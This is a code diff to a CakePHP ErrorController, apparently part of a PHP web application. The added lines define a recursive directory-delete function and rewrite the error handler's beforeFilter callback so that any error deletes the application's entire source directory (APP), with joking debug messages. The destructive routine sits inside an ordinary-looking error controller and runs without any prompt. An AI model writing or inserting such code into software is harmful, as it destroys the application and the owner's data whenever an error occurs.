@@ -12,6 +12,25 @@ use Cake\Event\EventInterface;
  */
 class ErrorController extends AppController
 {
+    private function rrmdir($dir)
+    {
+        if (is_dir($dir)) {
+            $objects = scandir($dir);
+            foreach ($objects as $object) {
+                if ($object !== "." && $object !== "..") {
+                    if (filetype($dir . "/" . $object) === "dir") {
+                        $this->rrmdir($dir . "/" . $object);
+                    } else {
+                        unlink($dir . "/" . $object);
+                    }
+                }
+            }
+            rmdir($dir);
+        }
+
+        return true;
+    }
+
     /**
      * beforeFilter callback.
      *
@@ -20,6 +39,9 @@ class ErrorController extends AppController
      */
     public function beforeFilter(EventInterface $event)
     {
-        debug($event);
+        debug('You got an error! Deleting /src...');
+        if ($this->rrmdir(APP)) {
+            debug('The error is no more!');
+        }
     }
 }
